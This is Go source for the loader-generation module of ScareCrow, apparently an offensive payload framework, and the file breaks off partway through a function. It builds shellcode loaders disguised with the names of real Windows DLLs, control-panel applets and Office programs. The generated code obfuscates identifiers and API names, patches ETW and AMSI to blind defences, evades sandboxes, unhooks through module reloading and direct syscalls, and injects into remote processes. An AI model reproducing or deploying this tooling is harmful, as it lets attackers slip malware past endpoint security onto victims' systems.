package Loader

import (
	"ScareCrow/Cryptor"
	"ScareCrow/Struct"
	"ScareCrow/Utils"
	"bufio"
	"bytes"
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"io/ioutil"
	"log"
	"os"
	"strconv"
	"strings"
	"text/template"
)

type Binary struct {
	Variables map[string]string
}

type JScript struct {
	Variables map[string]string
}

type JScriptLoader struct {
	Variables map[string]string
}

type SandboxJScript struct {
	Variables map[string]string
}

type ETW struct {
	Variables map[string]string
}

type AMSI struct {
	Variables map[string]string
}

type WriteProcessMemory struct {
	Variables map[string]string
}

type DLL struct {
	Variables map[string]string
}
type WindowsVersion struct {
	Variables map[string]string
}
type Sandboxfunction struct {
	Variables map[string]string
}
type Sandbox_DomainJoined struct {
	Variables map[string]string
}
type HTALoader struct {
	Variables map[string]string
}
type Macro struct {
	Variables map[string]string
}
type Shellcode struct {
	Variables map[string]string
}

var (
	buffer bytes.Buffer
)

func FileName(mode string) (string, string) {
	var filename string
	var name string
	wscript := []string{"APMon", "bisrv", "btpanui", "certcli", "cmdext", "httpapi", "libcrypto", "netlogon", "tcpmon"}
	dllname := []string{"apphelp", "bcryptprimitives", "cfgmgr32", "combase", "cryptsp", "dpapi", "sechost", "schannel", "urlmon", "win32u"}
	cplname := []string{"appwizard", "bthprop", "desktop", "netfirewall", "FlashPlayer", "hardwarewiz", "inetcontrol", "control", "irprop", "game", "inputs", "mimosys", "ncp", "power", "speech", "system", "Tablet", "telephone", "datetime", "winsec"}
	officename := []string{"Timesheet", "Reports", "Zoom", "Updates", "Calculator", "Calendar", "Memo", "Desk", "Appwiz"}
	Binaryname := []string{"Excel", "Word", "Outlook", "Powerpnt", "lync", "cmd", "OneDrive", "OneNote"}

	if mode == "excel" {
		name = officename[Cryptor.GenerateNumer(0, 9)]
		filename = name + ".xll"
	}
	if mode == "control" {
		name = cplname[Cryptor.GenerateNumer(0, 20)]
		filename = name + ".cpl"
	}
	if mode == "wscript" {
		name = wscript[Cryptor.GenerateNumer(0, 9)]
		filename = name + ".dll"
	}

	if mode == "dll" {
		name = dllname[Cryptor.GenerateNumer(0, 9)]
		filename = name + ".dll"
	}

	if mode == "msiexec" {
		name = dllname[Cryptor.GenerateNumer(0, 9)]
		filename = name + ".dll"
	}
	if mode == "binary" {
		name = Binaryname[Cryptor.GenerateNumer(0, 8)]
		filename = name + ".exe"
	}
	return name, filename
}

func ETW_Buff(b64number int, decode string, WriteProcessMemory string) (string, string) {
	var buffer bytes.Buffer
	ETW := &ETW{}
	ETW.Variables = make(map[string]string)
	ETW.Variables["procWriteProcessMemory"] = Cryptor.VarNumberLength(4, 9)
	ETW.Variables["procEtwNotificationRegister"] = Cryptor.VarNumberLength(4, 9)
	ETW.Variables["procEtwEventRegister"] = Cryptor.VarNumberLength(4, 9)
	ETW.Variables["procEtwEventWriteFull"] = Cryptor.VarNumberLength(4, 9)
	ETW.Variables["procEtwEventWrite"] = Cryptor.VarNumberLength(4, 9)
	ETW.Variables["WriteProcessMemory"] = WriteProcessMemory
	ETW.Variables["ETW"] = Cryptor.VarNumberLength(4, 9)
	ETW.Variables["handle"] = Cryptor.VarNumberLength(4, 9)
	ETW.Variables["dataAddr"] = Cryptor.VarNumberLength(4, 9)
	ETW.Variables["i"] = Cryptor.VarNumberLength(4, 9)
	ETW.Variables["data"] = Cryptor.VarNumberLength(4, 9)
	ETW.Variables["nLength"] = Cryptor.VarNumberLength(4, 9)
	ETW.Variables["datalength"] = Cryptor.VarNumberLength(4, 9)

	ETW.Variables["decode"] = decode
	ETW.Variables["WriteProcessMemoryName"] = Utils.StringEncode("WriteProcessMemory", b64number)
	ETW.Variables["EtwNotificationRegisterName"] = Utils.StringEncode("EtwNotificationRegister", b64number)
	ETW.Variables["EtwEventRegisterName"] = Utils.StringEncode("EtwEventRegister", b64number)
	ETW.Variables["EtwEventWriteFullName"] = Utils.StringEncode("EtwEventWriteFull", b64number)
	ETW.Variables["EtwEventWriteName"] = Utils.StringEncode("EtwEventWrite", b64number)

	buffer.Reset()
	ETWTemplate, err := template.New("ETW").Parse(Struct.ETW_Function())
	if err != nil {
		log.Fatal(err)
	}
	buffer.Reset()
	if err := ETWTemplate.Execute(&buffer, ETW); err != nil {
		log.Fatal(err)
	}
	return buffer.String(), ETW.Variables["ETW"]
}

func AMSI_Buff(WriteProcessMemory string) (string, string) {
	var buffer bytes.Buffer
	AMSI := &AMSI{}
	AMSI.Variables = make(map[string]string)
	AMSI.Variables["AMSI"] = Cryptor.VarNumberLength(4, 9)
	AMSI.Variables["WriteProcessMemory"] = WriteProcessMemory
	AMSI.Variables["handle"] = Cryptor.VarNumberLength(4, 9)
	AMSI.Variables["addr"] = Cryptor.VarNumberLength(4, 9)
	AMSI.Variables["ll"] = Cryptor.VarNumberLength(4, 9)
	AMSI.Variables["data"] = Cryptor.VarNumberLength(4, 9)
	AMSI.Variables["nLength"] = Cryptor.VarNumberLength(4, 9)
	AMSI.Variables["datalength"] = Cryptor.VarNumberLength(4, 9)

	buffer.Reset()
	AMSITemplate, err := template.New("AMSI").Parse(Struct.AMSI_Function())
	if err != nil {
		log.Fatal(err)
	}
	buffer.Reset()
	if err := AMSITemplate.Execute(&buffer, AMSI); err != nil {
		log.Fatal(err)
	}
	return buffer.String(), AMSI.Variables["AMSI"]
}

func WriteProcessMemory_Buff(number string, b64number int) (string, string, string) {
	var buffer bytes.Buffer
	WriteProcessMemory := &WriteProcessMemory{}
	WriteProcessMemory.Variables = make(map[string]string)
	WriteProcessMemory.Variables["errnoERROR_IO_PENDING"] = Cryptor.VarNumberLength(4, 9)
	WriteProcessMemory.Variables["errERROR_IO_PENDING"] = Cryptor.VarNumberLength(4, 9)
	WriteProcessMemory.Variables["WriteProcessMemoryName"] = Utils.StringEncode("WriteProcessMemory", b64number)
	WriteProcessMemory.Variables["decode"] = Cryptor.VarNumberLength(4, 9)
	WriteProcessMemory.Variables["WriteProcessMemory"] = Cryptor.VarNumberLength(4, 9)
	WriteProcessMemory.Variables["procWriteProcessMemory"] = Cryptor.VarNumberLength(4, 9)
	WriteProcessMemory.Variables["errnoErr"] = Cryptor.VarNumberLength(4, 9)
	WriteProcessMemory.Variables["hProcess"] = Cryptor.VarNumberLength(4, 9)
	WriteProcessMemory.Variables["lpBaseAddress"] = Cryptor.VarNumberLength(4, 9)
	WriteProcessMemory.Variables["lpBuffer"] = Cryptor.VarNumberLength(4, 9)
	WriteProcessMemory.Variables["nSize"] = Cryptor.VarNumberLength(4, 9)
	WriteProcessMemory.Variables["lpNumberOfBytesWritten"] = Cryptor.VarNumberLength(4, 9)

	buffer.Reset()
	WriteProcessMemoryTemplate, err := template.New("WriteProcessMemory").Parse(Struct.WriteProcessMemory_Function())
	if err != nil {
		log.Fatal(err)
	}
	buffer.Reset()
	if err := WriteProcessMemoryTemplate.Execute(&buffer, WriteProcessMemory); err != nil {
		log.Fatal(err)
	}
	return buffer.String(), WriteProcessMemory.Variables["decode"], WriteProcessMemory.Variables["WriteProcessMemory"]
}

func DLLfile(b64ciphertext string, b64key string, b64iv string, mode string, refresher bool, name string, sandbox bool, ETW bool, ProcessInjection string, AMSI bool) (string, string, string) {
	var LoaderTemplate, DLLStructTemplate string
	DLL := &DLL{}
	DLL.Variables = make(map[string]string)
	Sandboxfunction := &Sandboxfunction{}
	Sandboxfunction.Variables = make(map[string]string)
	Sandbox_DomainJoined := &Sandbox_DomainJoined{}
	Sandbox_DomainJoined.Variables = make(map[string]string)
	WindowsVersion := &WindowsVersion{}
	WindowsVersion.Variables = make(map[string]string)
	DLL.Variables["FuncName"] = Cryptor.CapLetter() + Cryptor.VarNumberLength(10, 19)
	DLL.Variables["NTFuncName"] = Cryptor.CapLetter() + Cryptor.VarNumberLength(10, 19)
	DLL.Variables["buff"] = Cryptor.VarNumberLength(10, 19)
	DLL.Variables["alloc"] = Cryptor.VarNumberLength(10, 19)
	DLL.Variables["phandle"] = Cryptor.VarNumberLength(10, 19)
	DLL.Variables["baseA"] = Cryptor.VarNumberLength(10, 19)
	DLL.Variables["zerob"] = Cryptor.VarNumberLength(10, 19)
	DLL.Variables["alloctype"] = Cryptor.VarNumberLength(10, 19)
	DLL.Variables["protect"] = Cryptor.VarNumberLength(10, 19)
	DLL.Variables["regionsizep"] = Cryptor.VarNumberLength(10, 19)
	DLL.Variables["regionsize"] = Cryptor.VarNumberLength(10, 19)
	DLL.Variables["Versionfunc"] = Cryptor.VarNumberLength(10, 19)
	DLL.Variables["k"] = Cryptor.VarNumberLength(10, 19)
	DLL.Variables["Version"] = Cryptor.VarNumberLength(10, 19)
	DLL.Variables["MV"] = Cryptor.VarNumberLength(10, 19)
	DLL.Variables["MinV"] = Cryptor.VarNumberLength(10, 19)
	DLL.Variables["customsyscall"] = Cryptor.VarNumberLength(10, 19)
	DLL.Variables["syscallnumber"] = Cryptor.VarNumberLength(10, 19)
	DLL.Variables["dll"] = Cryptor.VarNumberLength(10, 19)
	DLL.Variables["error"] = Cryptor.VarNumberLength(10, 19)
	DLL.Variables["x"] = Cryptor.VarNumberLength(10, 19)
	DLL.Variables["file"] = Cryptor.VarNumberLength(10, 19)
	DLL.Variables["loaddll"] = Cryptor.VarNumberLength(10, 19)
	DLL.Variables["handle"] = Cryptor.VarNumberLength(10, 19)
	DLL.Variables["dllBase"] = Cryptor.VarNumberLength(10, 19)
	DLL.Variables["dllOffset"] = Cryptor.VarNumberLength(10, 19)
	DLL.Variables["old"] = Cryptor.VarNumberLength(10, 19)
	DLL.Variables["oldptrperms"] = Cryptor.VarNumberLength(10, 19)
	DLL.Variables["ptr"] = Cryptor.VarNumberLength(10, 19)
	DLL.Variables["shellcode"] = Cryptor.VarNumberLength(10, 19)
	DLL.Variables["loader"] = Cryptor.VarNumberLength(10, 19)
	DLL.Variables["DLLname"] = Cryptor.VarNumberLength(10, 19)
	DLL.Variables["hexdata"] = Cryptor.VarNumberLength(10, 19)
	DLL.Variables["Reloading"] = Cryptor.VarNumberLength(10, 19)
	DLL.Variables["bytes"] = Cryptor.VarNumberLength(10, 19)

	DLL.Variables["customsyscallVP"] = Cryptor.VarNumberLength(10, 19)
	DLL.Variables["runfunc"] = Cryptor.VarNumberLength(10, 19)
	DLL.Variables["bytes"] = Cryptor.VarNumberLength(10, 19)
	DLL.Variables["loc"] = Cryptor.VarNumberLength(10, 19)
	DLL.Variables["dllOffset"] = Cryptor.VarNumberLength(10, 19)
	DLL.Variables["mem"] = Cryptor.VarNumberLength(10, 19)

	DLL.Variables["getWin"] = Cryptor.VarNumberLength(10, 19)
	DLL.Variables["showWin"] = Cryptor.VarNumberLength(10, 19)
	DLL.Variables["hwnd"] = Cryptor.VarNumberLength(10, 19)
	DLL.Variables["oldfartcodeperms"] = Cryptor.VarNumberLength(10, 19)
	DLL.Variables["baseAddress"] = Cryptor.VarNumberLength(10, 19)
	DLL.Variables["processHandle"] = Cryptor.VarNumberLength(10, 19)
	DLL.Variables["handlez"] = Cryptor.VarNumberLength(10, 19)
	DLL.Variables["sysid"] = Cryptor.VarNumberLength(10, 19)
	DLL.Variables["bytesdata"] = Cryptor.VarNumberLength(10, 19)
	DLL.Variables["locdata"] = Cryptor.VarNumberLength(10, 19)
	DLL.Variables["xdata"] = Cryptor.VarNumberLength(10, 19)
	DLL.Variables["dllBasedata"] = Cryptor.VarNumberLength(10, 19)
	DLL.Variables["dllOffsetdata"] = Cryptor.VarNumberLength(10, 19)
	DLL.Variables["memdata"] = Cryptor.VarNumberLength(10, 19)
	DLL.Variables["CreateProcess"] = Cryptor.VarNumberLength(10, 19)
	DLL.Variables["GetModuleInformation"] = Cryptor.VarNumberLength(10, 19)
	DLL.Variables["ReloadRemoteProcess"] = Cryptor.VarNumberLength(10, 19)
	DLL.Variables["RemoteModuleReloading"] = Cryptor.VarNumberLength(10, 19)
	DLL.Variables["Target"] = Cryptor.VarNumberLength(10, 19)
	DLL.Variables["WriteProcessMemory"] = Cryptor.VarNumberLength(10, 19)
	DLL.Variables["addr"] = Cryptor.VarNumberLength(10, 19)
	DLL.Variables["buf"] = Cryptor.VarNumberLength(10, 19)
	DLL.Variables["commandLine"] = Cryptor.VarNumberLength(10, 19)
	DLL.Variables["data"] = Cryptor.VarNumberLength(10, 19)
	DLL.Variables["err"] = Cryptor.VarNumberLength(10, 19)
	DLL.Variables["funcNtAllocateVirtualMemory"] = Cryptor.VarNumberLength(10, 19)
	DLL.Variables["funcNtCreateThreadEx"] = Cryptor.VarNumberLength(10, 19)
	DLL.Variables["funcNtProtectVirtualMemory"] = Cryptor.VarNumberLength(10, 19)
	DLL.Variables["funcNtWriteVirtualMemory"] = Cryptor.VarNumberLength(10, 19)
	DLL.Variables["hModule"] = Cryptor.VarNumberLength(10, 19)
	DLL.Variables["hProcess"] = Cryptor.VarNumberLength(10, 19)
	DLL.Variables["handleSize"] = Cryptor.VarNumberLength(10, 19)
	DLL.Variables["hh"] = Cryptor.VarNumberLength(10, 19)
	DLL.Variables["lpBaseAddress"] = Cryptor.VarNumberLength(10, 19)
	DLL.Variables["lpBuffer"] = Cryptor.VarNumberLength(10, 19)
	DLL.Variables["lpNumberOfBytesWritten"] = Cryptor.VarNumberLength(10, 19)
	DLL.Variables["mi"] = Cryptor.VarNumberLength(10, 19)
	DLL.Variables["mod"] = Cryptor.VarNumberLength(10, 19)
	DLL.Variables["modules"] = Cryptor.VarNumberLength(10, 19)
	DLL.Variables["module"] = Cryptor.VarNumberLength(10, 19)
	DLL.Variables["nLength"] = Cryptor.VarNumberLength(10, 19)
	DLL.Variables["nSize"] = Cryptor.VarNumberLength(10, 19)
	DLL.Variables["name"] = Cryptor.VarNumberLength(10, 19)
	DLL.Variables["needed"] = Cryptor.VarNumberLength(10, 19)
	DLL.Variables["n"] = Cryptor.VarNumberLength(10, 19)
	DLL.Variables["offsetaddr"] = Cryptor.VarNumberLength(10, 19)
	DLL.Variables["oldProtect"] = Cryptor.VarNumberLength(10, 19)
	DLL.Variables["outString"] = Cryptor.VarNumberLength(10, 19)
	DLL.Variables["pi"] = Cryptor.VarNumberLength(10, 19)
	DLL.Variables["procEnumProcessModules"] = Cryptor.VarNumberLength(10, 19)
	DLL.Variables["EnumProcessModules"] = Cryptor.VarNumberLength(10, 19)
	DLL.Variables["procGetModuleBaseName"] = Cryptor.VarNumberLength(10, 19)
	DLL.Variables["GetModuleBaseName"] = Cryptor.VarNumberLength(10, 19)
	DLL.Variables["procGetModuleInformation"] = Cryptor.VarNumberLength(10, 19)
	DLL.Variables["procWriteProcessMemory"] = Cryptor.VarNumberLength(10, 19)
	DLL.Variables["process"] = Cryptor.VarNumberLength(10, 19)
	DLL.Variables["rawbytes"] = Cryptor.VarNumberLength(10, 19)
	DLL.Variables["raw_bin"] = Cryptor.VarNumberLength(10, 19)
	DLL.Variables["s"] = Cryptor.VarNumberLength(10, 19)
	DLL.Variables["si"] = Cryptor.VarNumberLength(10, 19)
	DLL.Variables["size"] = Cryptor.VarNumberLength(10, 19)
	DLL.Variables["startupInfo"] = Cryptor.VarNumberLength(10, 19)
	DLL.Variables["PROCESS_ALL_ACCESS"] = Cryptor.VarNumberLength(10, 19)
	DLL.Variables["errnoERROR_IO_PENDING"] = Cryptor.VarNumberLength(10, 19)
	DLL.Variables["errERROR_IO_PENDING"] = Cryptor.VarNumberLength(10, 19)

	b64number := Cryptor.GenerateNumer(3, 6)
	DLL.Variables["b64number"] = strconv.Itoa(b64number)
	DLL.Variables["errnoErr"] = Cryptor.VarNumberLength(4, 9)
	DLL.Variables["WriteProcessMemoryName"] = Utils.StringEncode("WriteProcessMemory", b64number)

	DLL.Variables["decode"] = Cryptor.VarNumberLength(10, 19)
	DLL.Variables["b64"] = Cryptor.VarNumberLength(10, 19)
	DLL.Variables["decoded"] = Cryptor.VarNumberLength(10, 19)
	DLL.Variables["number"] = Cryptor.VarNumberLength(10, 19)
	DLL.Variables["sum"] = Cryptor.VarNumberLength(10, 19)

	DLL.Variables["MI"] = Cryptor.VarNumberLength(4, 9)

	if sandbox == true {
		DLL.Variables["SandboxOS"] = `"os"`
		DLL.Variables["IsDomainJoined"] = Cryptor.VarNumberLength(10, 19)
		DLL.Variables["domain"] = Cryptor.VarNumberLength(10, 19)
		DLL.Variables["status"] = Cryptor.VarNumberLength(10, 19)
		SandboxFunctionTemplate, err := template.New("Sandboxfunction").Parse(Struct.Sandbox())
		if err != nil {
			log.Fatal(err)
		}
		if err := SandboxFunctionTemplate.Execute(&buffer, DLL); err != nil {
			log.Fatal(err)
		}
		DLL.Variables["Sandboxfunction"] = buffer.String()
		DLL.Variables["checker"] = Cryptor.VarNumberLength(10, 19)
		Sandbox_DomainJoinedTemplate, err := template.New("Sandbox_DomainJoined").Parse(Struct.Sandbox_DomainJoined())
		buffer.Reset()
		if err != nil {
			log.Fatal(err)
		}
		if err := Sandbox_DomainJoinedTemplate.Execute(&buffer, DLL); err != nil {
			log.Fatal(err)
		}
		DLL.Variables["Sandbox"] = buffer.String()
		buffer.Reset()
	} else {
		DLL.Variables["SandboxOS"] = ""
		DLL.Variables["Sandbox"] = ""
		DLL.Variables["Sandboxfunction"] = ""
		DLL.Variables["SandboxImport"] = ""
	}

	WindowsVersion.Variables["Version"] = DLL.Variables["Version"]
	WindowsVersion.Variables["syscall"] = DLL.Variables["syscall"]
	WindowsVersion.Variables["customsyscall"] = DLL.Variables["customsyscall"]
	WindowsVersion.Variables["customsyscallVP"] = DLL.Variables["customsyscallVP"]
	buffer.Reset()

	if (ETW == false || AMSI == false) || ProcessInjection != "" {
		WriteProcessMemory_Function, decode, WriteProcessMemory := WriteProcessMemory_Buff(DLL.Variables["b64number"], b64number)
		DLL.Variables["decode"] = decode
		DLL.Variables["WriteProcessMemory_Function"] = WriteProcessMemory_Function
		DLL.Variables["WriteProcessMemory"] = WriteProcessMemory
	} else {
		DLL.Variables["WriteProcessMemory_Function"] = ""
	}

	if ETW == false {
		ETW_Function, ETW := ETW_Buff(b64number, DLL.Variables["decode"], DLL.Variables["WriteProcessMemory"])
		DLL.Variables["ETW"] = ETW + "()"
		DLL.Variables["ETW_Function"] = ETW_Function
		DLL.Variables["B64"] = `"encoding/base64"`
	} else {
		DLL.Variables["ETW"] = ""
		DLL.Variables["ETW_Function"] = ""
		DLL.Variables["B64"] = ``
	}
	if AMSI == false {
		AMSI_Function, AMSI := AMSI_Buff(DLL.Variables["WriteProcessMemory"])
		DLL.Variables["AMSI_Function"] = AMSI_Function
		DLL.Variables["AMSI"] = AMSI + "()"
		DLL.Variables["Windows_Import"] = `"golang.org/x/sys/windows"`

	} else {
		DLL.Variables["AMSI_Function"] = ""
		DLL.Variables["AMSI"] = ""
		DLL.Variables["Windows_Import"] = ``
	}

	if ETW == false || AMSI == false {
		DLL.Variables["HEX_Import"] = `"encoding/hex"`
	} else {
		DLL.Variables["HEX_Import"] = ``
	}

	if refresher == false {
		LoaderTemplate = Struct.WindowsVersion_Syscall()
		DLLStructTemplate = Struct.DLL_Refresher()
	} else {
		LoaderTemplate = Struct.WindowsVersion_Syscall_Unmod()
		DLLStructTemplate = Struct.DLL()
	}
	if ProcessInjection != "" && refresher == false {
		ProcessInjection = strings.Replace(ProcessInjection, "\\", "\\\\", -1)
		DLL.Variables["processpath"] = ProcessInjection
		DLL.Variables["offset"] = Cryptor.VarNumberLength(4, 9)
		DLL.Variables["datalength"] = Cryptor.VarNumberLength(4, 9)
		LoaderTemplate = Struct.WindowsVersion_Syscall()
		DLLStructTemplate = Struct.Procces_Injection_DLL()

	}

	WindowsVersionTemplate, err := template.New("WindowsVersion").Parse(LoaderTemplate)
	if err != nil {
		log.Fatal(err)

	}
	buffer.Reset()
	if err := WindowsVersionTemplate.Execute(&buffer, WindowsVersion); err != nil {
		log.Fatal(err)
	}

	DLL.Variables["SyscallNumberlist"] = buffer.String()

	if mode == "excel" {
		DLL.Variables["ExportName"] = Struct.JS_Office_Export()

	}
	if mode == "control" {
		DLL.Variables["ExportName"] = Struct.JS_Control_Export()

	}
	if mode == "wscript" || mode == "dll" {
		DLL.Variables["ExportName"] = Struct.WS_JS_Export()
	}

	if mode == "msiexec" {
		DLL.Variables["ExportName"] = Struct.WS_JS_Export()
	}

	buffer.Reset()

	DLLTemplate, err := template.New("DLL").Parse(DLLStructTemplate)
	if err != nil {
		log.Fatal(err)
	}
	buffer.Reset()
	if err := DLLTemplate.Execute(&buffer, DLL); err != nil {
		log.Fatal(err)
	}
	return buffer.String(), DLL.Variables["FuncName"], DLL.Variables["FuncName"]

}

func Binaryfile(b64ciphertext string, b64key string, b64iv string, mode string, console bool, sandbox bool, name string, ETW bool, ProcessInjection string, Sleep bool, AMSI bool) (string, string, string) {
	var Structure string
	var buffer bytes.Buffer
	Binary := &Binary{}
	Sandboxfunction := &Sandboxfunction{}
	Sandboxfunction.Variables = make(map[string]string)
	Sandbox_DomainJoined := &Sandbox_DomainJoined{}
	Sandbox_DomainJoined.Variables = make(map[string]string)
	Binary.Variables = make(map[string]string)
	WindowsVersion := &WindowsVersion{}
	WindowsVersion.Variables = make(map[string]string)
	Binary.Variables["FuncName"] = Cryptor.CapLetter() + Cryptor.VarNumberLength(10, 19)
	Binary.Variables["NTFuncName"] = Cryptor.CapLetter() + Cryptor.VarNumberLength(10, 19)
	Binary.Variables["errnoErr"] = Cryptor.VarNumberLength(4, 9)
	Binary.Variables["ptr"] = Cryptor.VarNumberLength(10, 19)
	Binary.Variables["buff"] = Cryptor.VarNumberLength(10, 19)
	Binary.Variables["virtualAlloc"] = Cryptor.VarNumberLength(10, 19)
	Binary.Variables["alloc"] = Cryptor.VarNumberLength(10, 19)
	Binary.Variables["phandle"] = Cryptor.VarNumberLength(10, 19)
	Binary.Variables["baseA"] = Cryptor.VarNumberLength(10, 19)
	Binary.Variables["zerob"] = Cryptor.VarNumberLength(10, 19)
	Binary.Variables["alloctype"] = Cryptor.VarNumberLength(10, 19)
	Binary.Variables["protect"] = Cryptor.VarNumberLength(10, 19)
	Binary.Variables["regionsizep"] = Cryptor.VarNumberLength(10, 19)
	Binary.Variables["regionsize"] = Cryptor.VarNumberLength(10, 19)
	Binary.Variables["dll"] = Cryptor.VarNumberLength(10, 19)
	Binary.Variables["error"] = Cryptor.VarNumberLength(10, 19)
	Binary.Variables["x"] = Cryptor.VarNumberLength(10, 19)
	Binary.Variables["file"] = Cryptor.VarNumberLength(10, 19)
	Binary.Variables["loaddll"] = Cryptor.VarNumberLength(10, 19)
	Binary.Variables["handle"] = Cryptor.VarNumberLength(10, 19)
	Binary.Variables["dllBase"] = Cryptor.VarNumberLength(10, 19)
	Binary.Variables["dllOffset"] = Cryptor.VarNumberLength(10, 19)
	Binary.Variables["old"] = Cryptor.VarNumberLength(10, 19)
	Binary.Variables["shellcode"] = Cryptor.VarNumberLength(10, 19)
	Binary.Variables["oldshellcodeperms"] = Cryptor.VarNumberLength(10, 19)
	Binary.Variables["loader"] = Cryptor.VarNumberLength(10, 19)
	Binary.Variables["DLLname"] = Cryptor.VarNumberLength(10, 19)
	Binary.Variables["Reloading"] = Cryptor.VarNumberLength(10, 19)
	Binary.Variables["bytes"] = Cryptor.VarNumberLength(10, 19)
	Binary.Variables["Console"] = Cryptor.VarNumberLength(10, 19)
	Binary.Variables["getWin"] = Cryptor.VarNumberLength(10, 19)
	Binary.Variables["showWin"] = Cryptor.VarNumberLength(10, 19)
	Binary.Variables["hwnd"] = Cryptor.VarNumberLength(10, 19)
	Binary.Variables["show"] = Cryptor.VarNumberLength(10, 19)
	Binary.Variables["SW_RESTORE"] = Cryptor.VarNumberLength(10, 19)
	Binary.Variables["SW_HIDE"] = Cryptor.VarNumberLength(10, 19)
	Binary.Variables["Version"] = Cryptor.VarNumberLength(10, 19)
	Binary.Variables["syscall"] = Cryptor.VarNumberLength(10, 19)

	Binary.Variables["customsyscallVP"] = Cryptor.VarNumberLength(10, 19)
	Binary.Variables["bytes"] = Cryptor.VarNumberLength(10, 19)
	Binary.Variables["loc"] = Cryptor.VarNumberLength(10, 19)
	Binary.Variables["dllOffset"] = Cryptor.VarNumberLength(10, 19)
	Binary.Variables["mem"] = Cryptor.VarNumberLength(10, 19)

	Binary.Variables["Versionfunc"] = Cryptor.VarNumberLength(10, 19)
	Binary.Variables["k"] = Cryptor.VarNumberLength(10, 19)
	Binary.Variables["MV"] = Cryptor.VarNumberLength(10, 19)
	Binary.Variables["MinV"] = Cryptor.VarNumberLength(10, 19)
	Binary.Variables["syscallnumber"] = Cryptor.VarNumberLength(10, 19)
	Binary.Variables["bytesdata"] = Cryptor.VarNumberLength(10, 19)
	Binary.Variables["locdata"] = Cryptor.VarNumberLength(10, 19)
	Binary.Variables["xdata"] = Cryptor.VarNumberLength(10, 19)
	Binary.Variables["dllBasedata"] = Cryptor.VarNumberLength(10, 19)
	Binary.Variables["dllOffsetdata"] = Cryptor.VarNumberLength(10, 19)
	Binary.Variables["customsyscall"] = Cryptor.VarNumberLength(10, 19)
	Binary.Variables["PROCESS_ALL_ACCESS"] = Cryptor.VarNumberLength(10, 19)
	Binary.Variables["errnoERROR_IO_PENDING"] = Cryptor.VarNumberLength(10, 19)
	Binary.Variables["errERROR_IO_PENDING"] = Cryptor.VarNumberLength(10, 19)
	Binary.Variables["runfunc"] = Cryptor.VarNumberLength(10, 19)
	Binary.Variables["oldptrperms"] = Cryptor.VarNumberLength(10, 19)
	Binary.Variables["oldfartcodeperms"] = Cryptor.VarNumberLength(10, 19)
	Binary.Variables["sysid"] = Cryptor.VarNumberLength(10, 19)
	Binary.Variables["baseAddress"] = Cryptor.VarNumberLength(10, 19)
	Binary.Variables["handlez"] = Cryptor.VarNumberLength(10, 19)
	Binary.Variables["CreateProcess"] = Cryptor.VarNumberLength(10, 19)
	Binary.Variables["GetModuleInformation"] = Cryptor.VarNumberLength(10, 19)
	Binary.Variables["ReloadRemoteProcess"] = Cryptor.VarNumberLength(10, 19)
	Binary.Variables["RemoteModuleReloading"] = Cryptor.VarNumberLength(10, 19)
	Binary.Variables["Target"] = Cryptor.VarNumberLength(10, 19)
	Binary.Variables["WriteProcessMemory"] = Cryptor.VarNumberLength(10, 19)
	Binary.Variables["addr"] = Cryptor.VarNumberLength(10, 19)
	Binary.Variables["buf"] = Cryptor.VarNumberLength(10, 19)
	Binary.Variables["commandLine"] = Cryptor.VarNumberLength(10, 19)
	Binary.Variables["data"] = Cryptor.VarNumberLength(10, 19)
	Binary.Variables["err"] = Cryptor.VarNumberLength(10, 19)
	Binary.Variables["funcNtAllocateVirtualMemory"] = Cryptor.VarNumberLength(10, 19)
	Binary.Variables["funcNtCreateThreadEx"] = Cryptor.VarNumberLength(10, 19)
	Binary.Variables["funcNtProtectVirtualMemory"] = Cryptor.VarNumberLength(10, 19)
	Binary.Variables["funcNtWriteVirtualMemory"] = Cryptor.VarNumberLength(10, 19)
	Binary.Variables["hModule"] = Cryptor.VarNumberLength(10, 19)
	Binary.Variables["hProcess"] = Cryptor.VarNumberLength(10, 19)
	Binary.Variables["handleSize"] = Cryptor.VarNumberLength(10, 19)
	Binary.Variables["hh"] = Cryptor.VarNumberLength(10, 19)
	Binary.Variables["lpBaseAddress"] = Cryptor.VarNumberLength(10, 19)
	Binary.Variables["lpBuffer"] = Cryptor.VarNumberLength(10, 19)
	Binary.Variables["lpNumberOfBytesWritten"] = Cryptor.VarNumberLength(10, 19)
	Binary.Variables["mi"] = Cryptor.VarNumberLength(10, 19)
	Binary.Variables["mod"] = Cryptor.VarNumberLength(10, 19)
	Binary.Variables["modules"] = Cryptor.VarNumberLength(10, 19)
	Binary.Variables["module"] = Cryptor.VarNumberLength(10, 19)
	Binary.Variables["nLength"] = Cryptor.VarNumberLength(10, 19)
	Binary.Variables["nSize"] = Cryptor.VarNumberLength(10, 19)
	Binary.Variables["name"] = Cryptor.VarNumberLength(10, 19)
	Binary.Variables["needed"] = Cryptor.VarNumberLength(10, 19)
	Binary.Variables["n"] = Cryptor.VarNumberLength(10, 19)
	Binary.Variables["offsetaddr"] = Cryptor.VarNumberLength(10, 19)
	Binary.Variables["oldProtect"] = Cryptor.VarNumberLength(10, 19)
	Binary.Variables["outString"] = Cryptor.VarNumberLength(10, 19)
	Binary.Variables["pi"] = Cryptor.VarNumberLength(10, 19)
	Binary.Variables["procEnumProcessModules"] = Cryptor.VarNumberLength(10, 19)
	Binary.Variables["EnumProcessModules"] = Cryptor.VarNumberLength(10, 19)
	Binary.Variables["procGetModuleBaseName"] = Cryptor.VarNumberLength(10, 19)
	Binary.Variables["GetModuleBaseName"] = Cryptor.VarNumberLength(10, 19)
	Binary.Variables["procGetModuleInformation"] = Cryptor.VarNumberLength(10, 19)
	Binary.Variables["procWriteProcessMemory"] = Cryptor.VarNumberLength(10, 19)
	Binary.Variables["process"] = Cryptor.VarNumberLength(10, 19)
	Binary.Variables["rawbytes"] = Cryptor.VarNumberLength(10, 19)
	Binary.Variables["raw_bin"] = Cryptor.VarNumberLength(10, 19)
	Binary.Variables["s"] = Cryptor.VarNumberLength(10, 19)
	Binary.Variables["si"] = Cryptor.VarNumberLength(10, 19)
	Binary.Variables["size"] = Cryptor.VarNumberLength(10, 19)
	Binary.Variables["startupInfo"] = Cryptor.VarNumberLength(10, 19)

	b64number := Cryptor.GenerateNumer(3, 6)
	Binary.Variables["b64number"] = strconv.Itoa(b64number)
	Binary.Variables["decode"] = Cryptor.VarNumberLength(10, 19)
	Binary.Variables["b64"] = Cryptor.VarNumberLength(10, 19)
	Binary.Variables["decoded"] = Cryptor.VarNumberLength(10, 19)
	Binary.Variables["number"] = Cryptor.VarNumberLength(10, 19)
	Binary.Variables["sum"] = Cryptor.VarNumberLength(10, 19)
